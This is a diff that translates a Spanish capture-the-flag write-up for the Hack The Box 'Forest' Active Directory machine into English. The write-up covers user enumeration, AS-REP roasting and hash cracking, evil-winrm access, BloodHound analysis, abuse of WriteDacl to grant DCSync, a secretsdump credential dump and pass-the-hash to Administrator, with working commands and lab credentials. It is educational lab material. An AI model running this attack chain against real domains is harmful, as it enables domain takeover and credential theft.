@@ -2,7 +2,7 @@
 
 # Enumeration
 
->Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:
+>We'll start with a port scan using the automatic TCP port scan script I've created:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -60,7 +60,7 @@ Puertos TCP abiertos:
 |_    Message signing enabled and required
 ```
 
-> Vamos a enumerar la versión de Windows y el dominio de Active Directory empleando crackmapexec:
+> Let's list the Windows version and the Active Directory domain using crackmapexec:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -68,14 +68,14 @@ Puertos TCP abiertos:
 SMB         10.129.25.66    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 ```
 
-> Vamos a agregar el dominio a nuestro resolutor local (/etc/hosts) para que pueda resolver el nombre de dominio:
+> Let's add the domain to our local host file (/etc/hosts) so that it can resolve the domain name:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
 └─$ echo '10.129.25.66 htb.local' >> /etc/hosts
 ```
 
->Si nos conectamos por RPC de forma anónima podemos enumerar los usuarios del dominio:
+>If we connect via RPC anonymously, we can list the users in the domain:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -114,14 +114,14 @@ user:[mark] rid:[0x47f]
 user:[santi] rid:[0x480]
 ```
 
->Vamos a meterlos en un archivo y tratar el texto para quedarnos solo con los usuarios:
+>Let's put them into a file and process the text so that we're left with just the users:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
 └─$ cat users | awk '{print $2}' FS=":" | awk '{print $1}' FS=" " | tr -d '[]' > valid_users
 ```
 
->Teniendo esta lista, vamos a comprobar si son válidos con kerbrute:
+>Now that we have this list, let's check whether they are valid using kerbrute:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
@@ -159,7 +159,7 @@ Version: dev (n/a) - 04/08/25 - Ronnie Flathers @ropnop
 2025/04/08 14:34:46 >  Done! Tested 31 usernames (18 valid) in 0.248 seconds
 ```
 
->Vamos a realizar un ataque ASREP-ROAST para intentar obtener el hash de alguno de estos usuarios y vemos que obtenemos uno del usuario svc_alfresco:
+>We are going to carry out an ASREP-ROAST attack to try to obtain the hash for one of these users, and we can see that we have obtained one for the user svc_alfresco:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
@@ -172,7 +172,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:fb7f68e30e5957aa006b0a4d427688a9$a7ec169ede
 <SNIP>
 ```
 
->Vamos a crackearlo offline para obtener la contraseña del usuario empleando hashcat con la máscara 18200 que corresponde a los hashes ASREP de tipo 23 (`$krb5asrep$23$`):
+>We're going to crack it offline to retrieve the user's password using hashcat with the 18200 mask, which corresponds to ASREP hashes of type 23 (`$krb5asrep$23$`):
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
@@ -184,7 +184,7 @@ hashcat (v6.2.6) starting
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:fb7f68e30e5957aa006b0a4d427688a9$a7ec169edefd9abb3dc46795d890a3d2de51186ab3e489b2f6af33fa3d28e8950316e8e0f06c6f25402e2456e5899e82eeed4a21e65b3437fb1364d2584fcd2e0ada90e23a50a31e703e1f3f5327832ab95821730a285ebc0253604a95e7f1a4486ac7e6849e6e23366372bfca0a6ce1a0cbfec8360dd75763112d5df1fc5a3b1be0b51e201f53dff6476f2fbacc72145001a8d39a90f8a2b44ee9db3b581b5ecdecb388f705b0d53bda133634598593bfcb28cfb3f588a194861e9f5177480e112a66d3da48ec303c2dffaaa7841b3baf1e37517abde6fadb995e5e49f0696cbd8a6b2b518b:s3rvice
 ```
 
->Vamos a comprobar las credenciales mediante crackmapexec, por lo que podemos ver son válidas:
+>We're going to check the credentials using crackmapexec; as we can see, they're valid:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
@@ -193,7 +193,7 @@ SMB         10.129.25.66    445    FOREST           [*] Windows Server 2016 Stan
 SMB         10.129.25.66    445    FOREST           [+] htb.local\svc-alfresco:s3rvice
 ```
 
-> Vemos que no hay ningún usuario Kerberoasteable:
+>We can see that there are no Kerberoastable users:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
@@ -203,7 +203,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 No entries found!
 ```
 
->Vamos a realizar un dumpeo del dominio mediante LDAP empleando la herramienta ldapdomaindump:
+>We are going to dump the domain via LDAP using the ldapdomaindump tool:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
@@ -215,9 +215,11 @@ No entries found!
 [+] Domain dump finished
 ```
 
->Abrimos un servidor web en el directorio en el que se crearon los archivos y los vemos mediante el navegador.
+>We start a web server in the directory where the files were created and view them using a web browser.
 
->Aquí podremos ver que el usuario svc-alfresco pertenece al grupo Service Accounts que este grupo pertenece al grupo Privileged IT Accounts y que este grupo a su vez pertenece al grupo de Remote Management Users por lo que podemos conectarnos con evil-winrm a la máquina víctima:
+
+
+>Here we can see that the user `svc-alfresco` belongs to the **Service Accounts** group, that this group belongs to the **Privileged IT Accounts** group, and that this group in turn belongs to the **Remote Management Users** group; therefore, we can connect to the victim machine using evil-winrm:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
@@ -234,7 +236,7 @@ Info: Establishing connection to remote endpoint
 
 ```
 
->Aquí podemos ver el users.txt:
+>Here we can see the users.txt file:
 
 ```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls
@@ -250,7 +252,7 @@ Mode                LastWriteTime         Length Name
 
 # Privilege Escalation
 
->Ahora, ejecutaremos bloodhound-python para obtener datos que analizar en BloodHound del dominio para ver por donde podríamos escalar privilegios:
+>Now, we'll run bloodhound-python to retrieve data from the domain to analyze in BloodHound and see where we might be able to escalate privileges:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
@@ -276,7 +278,7 @@ INFO: Done in 00M 18S
 
 ```
 
->Vamos a comprimir los archivos resultantes del comando anterior en un zip para facilitar el importado a BloodHound:
+>Let's compress the files generated by the previous command into a zip file to make it easier to import them into BloodHound:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
@@ -290,7 +292,7 @@ INFO: Done in 00M 18S
   adding: 20250408150238_users.json (deflated 96%)
 ```
 
->Ahora iniciamos el servicio de Neo4j, la base de datos que emplea bloodhound:
+>We will now start the Neo4j service, the database used by Bloodhound:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
@@ -310,7 +312,7 @@ Started neo4j (pid:72155). It is available at http://localhost:7474
 There may be a short delay until the server is ready.
 ```
 
->Abrimos bloodhound de forma gráfica, nos logueamos con las credenciales de Neo4j e importamos el archivo zip, si da error de formato JSON, importar el zip arrastrándolo desde una carpeta a la aplicación:
+>Open Bloodhound via the graphical interface, log in using your Neo4j credentials and import the ZIP file; if you get a JSON format error, import the ZIP file by dragging it from a folder into the application:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
@@ -318,26 +320,26 @@ There may be a short delay until the server is ready.
 [1] 72791
 ```
 
->Aquí podemos ver que nuestro usuario tiene permisos GenericAll sobre el grupo Exchange Windows Permissions:
+>Here we can see that our user has GenericAll permissions on the Exchange Windows Permissions group:
 
 ![image](https://github.com/user-attachments/assets/f07b40ee-8265-4d9f-a0ae-6d44d4ae0ead)
 
 
->Este grupo tiene permisos de WriteDacl sobre el dominio por lo que podríamos explotarlo:
+>This group has WriteDacl permissions on the domain, so we could exploit this:
 
 ![image](https://github.com/user-attachments/assets/86f662f2-08f0-4850-96fc-9a374008df6b)
 
 
->El permiso GenericAll puede ser abusado para unirnos al grupo que deseemos, en este caso "Exchange Windows Permissions" :
+>The GenericAll permission can be misused to add us to any group we wish, in this case `Exchange Windows Permissions`:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions" svc-alfresco /add /domain
 The command completed successfully.
 ```
 
->Ahora que pertenecemos a este grupo tenemos permisos WriteDacl sobre el dominio.
+>Now that we are members of this group, we have WriteDacl permissions on the domain.
 
->Este permiso puede ser abusado para agregarle permisos de DCSync a un usuario de la siguiente forma, pero primero necesitaremos subir PowerView.ps1 e importarlo:
+>This permission can be exploited to grant DCSync permissions to a user as follows, but first we will need to upload PowerView.ps1 and import it:
 
 ```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> upload /home/kali/Desktop/machines/forest/PowerView.ps1
@@ -350,26 +352,26 @@ Info: Upload successful!
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Import-Module .\PowerView.ps1
 ```
 
->Preparamos las credenciales de svc-alfresco:
+>We set up the svc-alfresco credentials:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
 ```
 
->Le agregamos permisos de DCSync al usuario:
+>We added DCSync permissions to the user:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
 ```
 
->Pero no funcionará, ya que nos saca del grupo, por lo que deberemos juntar todo en un one-liner para que no le de tiempo al sistema de sacarnos del grupo:
+>But that won't work, as it takes us out of the group, so we'll have to put it all together in a single line so that the system doesn't have time to remove us from the group:
 
 ```powershell
 Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
 ```
 
->Para aprovecharnos de estos nuevos permisos vamos a emplear la herramienta de impacket secretsdump para realizar un DCSync:
+>To take advantage of these new permissions, we're going to use the Impacket secretsdump tool to perform a DCSync:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest/aclpwn.py]
@@ -386,7 +388,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 <SNIP>
 ```
 
->Ahora haremos un PassTheHash para conectarnos al sistema como el usuario administrador y obtener la root.txt flag:
+>We will now perform a PassTheHash attack to log in to the system as the administrator user and obtain the root.txt flag:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/forest/aclpwn.py]
